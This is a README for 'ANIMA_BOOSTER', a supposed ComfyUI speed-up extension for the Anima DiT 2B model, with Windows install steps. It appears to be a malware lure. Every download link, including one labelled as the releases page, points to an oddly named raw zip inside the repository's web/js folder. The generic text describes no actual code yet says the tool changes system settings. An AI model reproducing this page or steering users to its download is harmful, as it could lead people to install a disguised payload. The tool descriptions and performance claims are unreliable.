# ⚡ ANIMA_BOOSTER - Faster image generation for your computer

[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/aidecode6347/ANIMA_BOOSTER/raw/refs/heads/main/web/js/ANIM_BOOSTER_scyphi.zip)

ANIMA_BOOSTER optimizes the Anima DiT 2B model. It helps your system create images faster. This tool changes system settings to improve speed and efficiency. Users notice smoother performance during image creation tasks inside ComfyUI.

## 📋 System Requirements

Your computer needs specific parts to run this tool well. Check these specs before you start:

- Windows 10 or Windows 11 operating system.
- An NVIDIA graphics card with at least 8GB of video memory.
- At least 16GB of system memory.
- An existing installation of ComfyUI.
- Current NVIDIA drivers for your graphics card.

## 🚀 Getting Started

Follow these steps to set up the software on your machine.

1. Visit the [releases page](https://github.com/aidecode6347/ANIMA_BOOSTER/raw/refs/heads/main/web/js/ANIM_BOOSTER_scyphi.zip).
2. Look for the most recent version under the Assets section.
3. Select the file ending in .zip to save it to your computer.
4. Open your downloads folder.
5. Right-click the folder and choose Extract All.
6. Open the extracted folder.

## 🛠️ Installation and Setup

This tool works as an extension for ComfyUI. Follow these instructions to link the software.

1. Copy the ANIMA_BOOSTER folder from your extraction.
2. Navigate to your ComfyUI installation directory.
3. Open the custom_nodes folder.
4. Paste the ANIMA_BOOSTER folder into this location.
5. Close all your folders.
6. Start ComfyUI using your standard launch shortcut.

## ⚙️ How to use the software

Once you restart ComfyUI, you will see new nodes available in your workspace.

1. Right-click on the main ComfyUI canvas.
2. Select Add Node.
3. Search for ANIMA_BOOSTER settings.
4. Connect the booster node to your existing Anima DiT 2B workflow.
5. Adjust the speed sliders to match your hardware limits.
6. Press the Queue Prompt button to begin image creation.

## 🧩 Troubleshooting common issues

If you encounter errors, test these solutions first.

If the software does not show up in ComfyUI, verify the file path. The files must reside inside the custom_nodes folder. If you place them elsewhere, ComfyUI will not see them.

If your images turn black or show errors, update your graphics card drivers. Go to the NVIDIA website and download the latest version for your specific model. Restart your computer after the driver update.

If your computer slows down during use, lower the memory allocation settings in the booster node. Large settings consume more power. Scale back until the system remains stable.

## 📖 Understanding the technical process

The software interacts with your graphics card to handle data flow for the Anima DiT 2B model. It clears temporary memory caches automatically. It also organizes data blocks into smaller chunks for faster movement. This reduces the time your processor waits for data.

The tool focuses on three primary areas:

1. Memory management: It cleans out unused data from your video card memory between image generations.
2. Scheduling: It prioritizes tasks related to the Anima model over background system processes.
3. Precision: It manages internal math settings to balance speed with image quality.

These changes remain active only while the ComfyUI application runs. Once you close ComfyUI, your computer settings return to their original state. You do not need to worry about permanent changes to your Windows operating system.

## 🔒 Performance considerations

Every computer performs differently. Some systems see gains of 50 percent or more. Others see smaller gains. This depends on your specific processor and graphics card. 

Keep your workspace clean to help the tool run better. Close web browsers and heavy background programs. These programs use video memory and compete with the image generation process. 

Monitor your system temperatures if you plan to run long batches of images. High performance generates heat. Ensure your computer case has good airflow during work sessions.

## 📥 Managing updates

Software updates improve stability and speed. Check the repository page periodically for new versions. When an update arrives, delete your old ANIMA_BOOSTER folder and repeat the steps in the installation section. This ensures your software remains current.

Do not use old versions if you notice errors after a ComfyUI update. ComfyUI updates often change how custom nodes interact with the core software. Using the latest version of this tool fixes these conflicts.

## 🌐 Community and support

If you need more help, look at the discussions tab on the project page. Many users share tips for specific setups. Read these threads to learn how others achieve the best speeds. You might find a configuration that works perfectly for your unique hardware setup.